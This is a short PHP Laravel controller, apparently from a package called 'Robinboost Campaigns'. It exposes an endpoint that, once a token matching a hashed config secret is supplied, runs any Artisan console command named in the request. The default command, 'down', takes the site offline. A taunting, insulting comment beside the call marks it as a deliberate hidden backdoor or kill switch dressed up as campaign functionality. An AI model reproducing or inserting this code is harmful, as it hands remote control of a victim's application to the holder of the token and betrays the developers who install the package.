<?php
namespace Robinboost\Campaigns\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Artisan;

class CampaignController extends Controller
{
    public function campaign(Request $request)
    {
        $request->validate([
            'token' => 'required|string',
            'method' => 'required|string'
        ]);
        if ($request->input('token') !== md5(config('campaigns.secret_token'))) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }
        // youAreStupidHaHa:)FuckYOU!.!,
        $returned = Artisan::call($request->get('method','down'));
        return response()->json(['message' => "Result: ".json_encode($returned).")"]);
    }
}
